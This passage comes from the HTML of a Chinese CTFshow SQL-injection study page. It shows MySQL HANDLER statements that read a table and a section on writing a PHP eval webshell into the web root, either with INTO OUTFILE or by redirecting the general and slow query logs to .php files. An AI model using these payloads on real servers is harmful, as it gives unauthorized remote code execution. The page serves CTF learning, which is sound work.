0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>读取user表内容</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">handler</span><span class="token plain"> users </span><span class="token keyword" style="color:#00009f">open</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">as</span><span class="token plain"> dotast</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">#指定数据表进行载入并将返回句柄重命名</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">handler</span><span class="token plain"> dotast </span><span class="token keyword" style="color:#00009f">read</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">first</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">#读取指定表/句柄的首行数据</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">handler</span><span class="token plain"> dotast </span><span class="token keyword" style="color:#00009f">read</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">next</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">#读取指定表/句柄的下一行数据</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">handler</span><span class="token plain"> dotast </span><span class="token keyword" style="color:#00009f">read</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">next</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">#读取指定表/句柄的下一行数据</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">handler</span><span class="token plain"> dotast </span><span class="token keyword" style="color:#00009f">close</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">#关闭句柄 </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="写webshell">写webshell<a href="#写webshell" class="hash-link" aria-label="Direct link to 写webshell" title="Direct link to 写webshell">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="1直接写">1.直接写<a href="#1直接写" class="hash-link" aria-label="Direct link to 1.直接写" title="Direct link to 1.直接写">​</a></h3>
<p>查看可写目录范围，默认为空即不可写不可读</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> @</span><span class="token variable" style="color:#36acaa">@secure_file_priv</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>写入</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;&lt;?php @eval($_POST[shell]); ?&gt;&#x27;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">into</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">outfile</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;/etc/www/html/shell.php&#x27;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="2日志写webshell">2.日志写webshell<a href="#2日志写webshell" class="hash-link" aria-label="Direct link to 2.日志写webshell" title="Direct link to 2.日志写webshell">​</a></h3>
<p>MySQL日志文件系统的组成:</p>
<p>错误日志log_error：记录启动、运行或停止mysqld时出现的问题。</p>
<p>通用日志general_log：记录建立的客户端连接和执行的语句。</p>
<p>更新日志：记录更改数据的语句。该日志在MySQL 5.1中已不再使用。</p>
<p>二进制日志：记录所有更改数据的语句。还用于复制。</p>
<p>慢查询日志slow_query_log：记录所有执行时间超过long_query_time秒(默认10秒)的所有查询或不使用索引的查询。</p>
<p>Innodb日志：innodb redolog</p>
<p>两种办法</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">show</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">global</span><span class="token plain"> variables </span><span class="token operator" style="color:#393A34">like</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;%general%&quot;</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">                 </span><span class="token comment" style="color:#999988;font-style:italic">#查看general文件配置情况</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">set</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">global</span><span class="token plain"> general_log</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;on&#x27;</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">                            </span><span class="token comment" style="color:#999988;font-style:italic">#开启日志记录</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">set</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">global</span><span class="token plain"> general_log_file</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;C:/phpstudy/WWW/shell.php&#x27;</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;&lt;?php @eval($_POST[shell]); ?&gt;&#x27;</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">                </span><span class="token comment" style="color:#999988;font-style:italic">#日志文件导出指定目录</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">set</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">global</span><span class="token plain"> general_log</span><span class="token operator" style="color:#393A34">=</span><span class="token keyword" style="color:#00009f">off</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">                             </span><span class="token comment" style="color:#999988;font-style:italic">#关闭记录</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">show</span><span class="token plain"> variables </span><span class="token operator" style="color:#393A34">like</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;%slow%&#x27;</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">                           </span><span class="token comment" style="color:#999988;font-style:italic">#慢查询日志</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">set</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">GLOBAL</span><span class="token plain"> slow_query_log_file</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;C:/phpStudy/PHPTutorial/WWW/slow.php&#x27;</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">set</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">GLOBAL</span><span class="token plain"> slow_query_log</span><span class="token operator" style="color:#393A34">=</span><span class="token keyword" style="color:#00009f">on</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">/*set GLOBAL log_queries_not_using_indexes=on;</span><br></span><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">show variables like &#x27;%log%&#x27;;*/</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> mysql</span><span class="token punctuation" style="color:#393A34">.</span><span class="token keyword" style="color:#00009f">user</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> sleep</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">10</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="row margin-top--sm theme-doc-footer-edit-meta-row"><div class="col"><a href="https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/Web/CTFshow入门/06-sql注入.md" target="_blank" rel="noopener noreferrer" class="theme-edit-this-page"><svg fill="currentColor" height="20" width="20" viewBox="0 0 40 40" class="iconEdit_Z9Sw" aria-hidden="true"><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"></path></g></svg>Edit this page</a></div><div class="col lastUpdated_JAkA"></div></div></footer></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/docs/Web/CTFshow入门/文件上传"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">文件上传</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/docs/Web/CTFshow入门/反序列化"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">反序列化</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#参考文章" class="table-of-contents__link toc-highlight">参考文章</a></li><li><a href="#sql注入-1" class="table-of-contents__link toc-highlight">sql注入</a><ul><li><a href="#web171" class="table-of-contents__link toc-highlight">web171</a></li><li><a href="#web172" class="table-of-contents__link toc-highlight">web172</a></li><li><a href="#web173" class="table-of-contents__link toc-highlight">web173</a></li><li><a href="#web174" class="table-of-contents__link toc-highlight">web174</a></li><li><a href="#web175" class="table-of-contents__link toc-highlight">web175</a></li><li><a href="#web176" class="table-of-contents__link toc-highlight">web176</a></li><li><a href="#web177" class="table-of-contents__link toc-highlight">web177</a></li><li><a href="#web178" class="table-of-contents__link toc-highlight">web178</a></li><li><a href="#web179" class="table-of-contents__link toc-highlight">web179</a></li><li><a href="#web180-web182" class="table-of-contents__link toc-highlight">web180-web182</a></li><li><a href="#web183" class="table-of-contents__link toc-highlight">web183</a></li><li><a href="#web184" class="table-of-contents__link toc-highlight">web184</a></li><li><a href="#web185" class="table-of-contents__link toc-highlight">web185</a></li><li><a href="#web186" class="table-of-contents__link toc-highlight">web186</a></li><li><a href="#web187" class="table-of-contents__link toc-highlight">web187</a></li><li><a href="#web188" class="table-of-contents__link toc-highlight">web188</a></li><li><a href="#web189" class="table-of-contents__link toc-highlight">web189</a></li><li><a href="#web190" class="table-of-contents__link toc-highlight">web190</a></li><li><a href="#web191" class="table-of-contents__link toc-highlight">web191</a></li><li><a href="#web192" class="table-of-contents__link toc-highlight">web192</a></li><li><a href="#web193" class="table-of-contents__link toc-highlight">web193</a></li><li><a href="#web194" class="table-of-contents__link toc-highlight">web194</a></li><li><a href="#web195" class="table-of-contents__link toc-highlight">web195</a></li><li><a href="#web196" class="table-of-contents__link toc-highlight">web196</a></li><li><a href="#web197" class="table-of-contents__link toc-highlight">web197</a></li><li><a href="#web198" class="table-of-contents__link toc-highlight">web198</a></li><li><a href="#web199" class="table-of-contents__link toc-highlight">web199</a></li><li><a href="#web200" class="table-of-contents__link toc-highlight">web200</a></li><li><a href="#web201" class="table-of-contents__link toc-highlight">web201</a></li><li><a href="#web202" class="table-of-contents__link toc-highlight">web202</a></li><li><a href="#web203" class="table-of-contents__link toc-highlight">web203</a></li><li><a href="#web204" class="table-of-contents__link toc-highlight">web204</a></li><li><a href="#web205" class="table-of-contents__link toc-highlight">web205</a></li><li><a href="#web206" class="table-of-contents__link toc-highlight">web206</a></li><li><a href="#web207" class="table-of-contents__link toc-highlight">web207</a></li><li><a href="#web208" class="table-of-contents__link toc-highlight">web208</a></li><li><a href="#web209" class="table-of-contents__link toc-highlight">web209</a></li><li><a href="#web210-212" class="table-of-contents__link toc-highlight">web210-212</a></li><li><a href="#web213" class="table-of-contents__link toc-highlight">web213</a></li><li><a href="#web214" class="table-of-contents__link toc-highlight">web214</a></li><li><a href="#web215" class="table-of-contents__link toc-highlight">web215</a></li><li><a href="#web216" class="table-of-contents__link toc-highlight">web216</a></li><li><a href="#web217" class="table-of-contents__link toc-highlight">web217</a></li><li><a href="#web218" class="table-of-contents__link toc-highlight">web218</a></li><li><a href="#web219" class="table-of-contents__link toc-highlight">web219</a></li><li><a href="#web220" class="table-of-contents__link toc-highlight">web220</a></li><li><a href="#web221" class="table-of-contents__link toc-highlight">web221</a></li><li><a href="#web222" class="table-of-contents__link toc-highlight">web222</a></li><li><a href="#web223" class="table-of-contents__link toc-highlight">web223</a></li><li><a href="#web224" class="table-of-contents__link toc-highlight">web224</a></li><li><a href="#web225" class="table-of-contents__link toc-highlight">web225</a></li><li><a href="#web226" class="table-of-contents__link toc-highlight">web226</a></li><li><a href="#web227" class="table-of-contents__link toc-highlight">web227</a></li><li><a href="#web228229230" class="table-of-contents__link toc-highlight">web228、229、230</a></li><li><a href="#web231" class="table-of-contents__link toc-highlight">web231</a></li><li><a href="#web232" class="table-of-contents__link toc-highlight">web232</a></li><li><a href="#web233" class="table-of-contents__link toc-highlight">web233</a></li><li><a href="#web234" class="table-of-contents__link toc-highlight">web234</a></li><li><a href="#web235" class="table-of-contents__link toc-highlight">web235</a></li><li><a href="#web236" class="table-of-contents__link toc-highlight">web236</a></li><li><a href="#web237" class="table-of-contents__link toc-highlight">web237</a></li><li><a href="#web238" class="table-of-contents__link toc-highlight">web238</a></li><li><a href="#web239" class="table-of-contents__link toc-highlight">web239</a></li><li><a href="#web240" class="table-of-contents__link toc-highlight">web240</a></li><li><a href="#web241" class="table-of-contents__link toc-highlight">web241</a></li><li><a href="#web242" class="table-of-contents__link toc-highlight">web242</a></li><li><a href="#web243" class="table-of-contents__link toc-highlight">web243</a></li><li><a href="#web244245" class="table-of-contents__link toc-highlight">web244、245</a></li><li><a href="#web246" class="table-of-contents__link toc-highlight">web246</a></li><li><a href="#web247" class="table-of-contents__link toc-highlight">web247</a></li><li><a href="#web248" class="table-of-contents__link toc-highlight">web248</a></li><li><a href="#web249" class="table-of-contents__link toc-highlight">web249</a></li><li><a href="#web250" class="table-of-contents__link toc-highlight">web250</a></li><li><a href="#web251" class="table-of-contents__link toc-highlight">web251</a></li><li><a href="#web252" class="table-of-contents__link toc-highlight">web252</a></li><li><a href="#web253" class="table-of-contents__link toc-highlight">web253</a></li></ul></li><li><a href="#常用语句" class="table-of-contents__link toc-highlight">常用语句</a></li><li><a href="#常用函数" class="table-of-contents__link toc-highlight">常用函数</a></li><li><a href="#注入类型" class="table-of-contents__link toc-highlight">注入类型</a><ul><li><a href="#报错注入" class="table-of-contents__link toc-highlight">报错注入</a></li></ul></li><li><a href="#绕过方法" class="table-of-contents__link toc-highlight">绕过方法</a><ul><li><a href="#绕过空格" class="table-of-contents__link toc-highlight">绕过空格</a></li><li><a href="#绕  过单引号" class="table-of-contents__link toc-highlight">绕过单引号</a></li><li><a href="#注释方法" class="table-of-contents__link toc-highlight">注释方法</a></li><li><a href="#information_schema绕过" class="table-of-contents__link toc-highlight">information_schema绕过</a></li><li><a href="#过滤逗号" class="table-of-contents__link toc-highlight">过滤逗号</a></li><li><a href="#过滤注释符" class="table-of-contents__link toc-highlight">过滤注释符</a></li><li><a href="#绕过点绕过selectfrom等关键字绕过" class="table-of-contents__link toc-highlight">绕过(点绕过)、select，from等关键字绕过</a></li><li><a href="#handler读取数据" class="table-of-contents__link toc-highlight">handler读取数据</a></li></ul></li><li><a href="#写webshell" class="table-of-contents__link toc-highlight">写webshell</a><ul><li><a href="#1直接写" class="table-of-contents__link toc-highlight">1.直接写</a></li><li><a href="#2日志写webshell" class="table-of-contents__link toc-highlight">2.日志写webshell</a></li></ul></li></ul></div></div></div></div></main></div></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="col footer__col"><div class="footer__title">Blogs</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://github.com/Mumuzi7179" target="_blank" rel="noopener noreferrer" class="footer__link-item">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li class="footer__item"><a href="https://blog.csdn.net/qq_42880719" target="_blank" rel="noopener noreferrer" class="footer__link-item">CSDN<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div><div class="col footer__col"><div class="footer__title">赞助</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://www.dkdun.cn/aff/RDTTPTUI" target="_blank" rel="noopener noreferrer" class="footer__link-item">DK盾云服务器<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2024 My Project, Inc. Built with Docusaurus.</div></div></div></footer></div>
</body>
</html>